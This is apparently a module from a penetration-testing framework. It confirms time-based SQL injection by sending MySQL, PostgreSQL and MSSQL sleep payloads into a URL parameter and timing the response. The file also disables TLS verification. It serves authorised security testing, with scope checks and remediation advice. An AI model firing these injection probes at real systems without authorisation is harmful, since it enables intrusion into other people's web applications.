"""
ARES Module - Time-based SQL Injection Validator

Confirms time-based SQL injection by measuring response delays
caused by database sleep functions (MySQL, PostgreSQL, MSSQL).

Module ID: web.sqli_time_based
MITRE ATT&CK: T1190 - Exploit Public-Facing Application
"""
from __future__ import annotations

import time
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from ares.core.errors import (
    ConnectionTimeout,
    ModuleValidationError,
)
from ares.sdk import BaseModule, ExecutionContext, ModuleResult, OpsecLevel, Severity


class WebSqliTimeBasedModule(BaseModule):
    """
    Confirm time-based SQL injection on a target parameter.

    The module injects database-specific sleep payloads and measures
    the elapsed time. If a response takes longer than the configured
    delay, the injection is confirmed.
    """

    # ── Required metadata ────────────────────────────────────────────────
    MODULE_ID          = "web.sqli_time_based"
    MODULE_NAME        = "Time-based SQL Injection Validator"
    MODULE_CATEGORY    = "web"
    MODULE_DESCRIPTION = "Confirm time-based SQLi by measuring database sleep delays"

    # ── OpSec: active queries, may trigger WAF alerts ───────────────────
    OPSEC_LEVEL = OpsecLevel.MEDIUM

    # ── Dependencies ─────────────────────────────────────────────────────
    REQUIRES = []
    OUTPUTS  = ["sqli_confirmed"]

    # ── MITRE ATT&CK ─────────────────────────────────────────────────────
    MITRE_TECHNIQUES = ["T1190"]

    MODULE_AUTHOR = "TrinityBerserker <gbsfiunam@gmail.com>"

    async def validate(self, ctx: ExecutionContext) -> None:
        """
        Validate the execution context before running.
        Ensures a target URL and delay are present and sane.
        """
        ctx.require("target")

        if "target_url" not in ctx.params:
            ctx.params["target_url"] = f"http://{ctx.target}"

        if "delay_seconds" not in ctx.params:
            ctx.params["delay_seconds"] = 5

        delay = ctx.params["delay_seconds"]
        if not (1 <= delay <= 10):
            raise ModuleValidationError(
                f"Invalid delay: {delay}. Must be between 1 and 10 seconds.",
                module_id=self.MODULE_ID,
                field="delay_seconds",
            )

        target_url = ctx.params["target_url"]
        if not target_url.startswith(("http://", "https://")):
            raise ModuleValidationError(
                f"Invalid URL: {target_url}. Must start with http:// or https://.",
                module_id=self.MODULE_ID,
                field="target_url",
            )

    async def execute(self, ctx: ExecutionContext) -> ModuleResult:
        """
        Run the time-based SQLi validation.

        Steps:
        1. Build payloads for MySQL, PostgreSQL, and MSSQL.
        2. Inject each payload into the target parameter.
        3. Measure response time.
        4. Emit a finding if the delay matches.
        """
        target_url = ctx.params.get("target_url", f"http://{ctx.target}")
        delay      = ctx.params.get("delay_seconds", 5)

        result = ModuleResult(
            module_id    = self.MODULE_ID,
            execution_id = ctx.execution_id,
        )

        # ── Rate limit + scope enforcement (always call this) ──
        await self.before_request(ctx.target, action="sqli_time_based")

        # ── Simulation mode (dry_run=True) ─────────────────────
        if ctx.dry_run:
            result.status = "success"
            result.artifacts = {
                "target_url": target_url,
                "delay_seconds": delay,
                "simulated": True,
            }
            return result

        # ── Real execution ──────────────────────────────────────
        payloads = {
            "MySQL":      f"1' AND SLEEP({delay})-- -",
            "PostgreSQL": f"1' AND pg_sleep({delay})-- -",
            "MSSQL":      f"1'; WAITFOR DELAY '0:0:{delay}'-- -",
        }

        for db_name, payload in payloads.items():
            test_url = self._inject_payload(target_url, payload)

            start_time = time.monotonic()
            try:
                await self._http_get(test_url, timeout=delay + 5)
            except ConnectionTimeout:
                # Timeout could mean the delay is working, but we check elapsed time
                pass
            elapsed = time.monotonic() - start_time

            if elapsed >= (delay - 0.5):
                f = self.finding(
                    title       = f"Time-based SQLi confirmed on {ctx.target}",
                    description = (
                        f"Injected {db_name} payload '{payload}' into "
                        f"{target_url}. Response took {elapsed:.2f}s."
                    ),
                    severity    = Severity.HIGH,
                    mitre_technique = "T1190",
                    host        = ctx.target,
                    evidence    = {
                        "payload": payload,
                        "database": db_name,
                        "elapsed_seconds": round(elapsed, 2),
                        "configured_delay": delay,
                    },
                )
                result.findings.append(f)
                result.status = "success"
                result.artifacts = {
                    "target_url": target_url,
                    "vulnerable": True,
                    "database": db_name,
                    "elapsed_seconds": round(elapsed, 2),
                }
                return result

        # If no payload triggered a delay
        result.status = "success"
        result.artifacts = {
            "target_url": target_url,
            "vulnerable": False,
            "tested_databases": list(payloads.keys()),
        }
        return result

    def report(self, result: ModuleResult) -> dict:
        """
        Format this module's result for the campaign report.
        """
        base = super().report(result)
        base["narrative"] = (
            "Time-based SQL injection validation completed. "
            "The module tested MySQL, PostgreSQL, and MSSQL sleep payloads. "
            "Review findings for confirmed vulnerabilities."
        )
        base["recommendations"] = [
            "Use parameterized queries or prepared statements.",
            "Validate and sanitize all user-supplied input.",
            "Deploy a Web Application Firewall (WAF) as a defence-in-depth measure.",
            "Audit the database user permissions for least privilege.",
        ]
        return base

    # ── Private helpers ──────────────────────────────────────────────────

    def _inject_payload(self, url: str, payload: str) -> str:
        """
        Inject the payload into the first query parameter of the URL.
        """
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)

        if not query_params:
            raise ModuleValidationError(
                f"URL has no query parameters to inject: {url}",
                module_id=self.MODULE_ID,
                field="target_url",
            )

        # Replace the first parameter's value
        for key in query_params:
            query_params[key] = [payload]
            break

        new_query = urlencode(query_params, doseq=True)
        return urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment,
        ))

    async def _http_get(self, url: str, timeout: float) -> Any:
        """
        Perform an HTTP GET request with httpx.
        Raise ARES-native exceptions on failure.
        """
        try:
            import httpx
        except ImportError:
            raise ModuleValidationError(
                "httpx is required for this module. Install with: pip install httpx",
                module_id=self.MODULE_ID,
            )

        try:
            async with httpx.AsyncClient(verify=False, timeout=timeout) as client:
                return await client.get(url, follow_redirects=True)
        except httpx.TimeoutException:
            raise ConnectionTimeout(
                f"HTTP timeout after {timeout}s for {url}",
                module_id=self.MODULE_ID,
                target=url,
                timeout_s=timeout,
            )
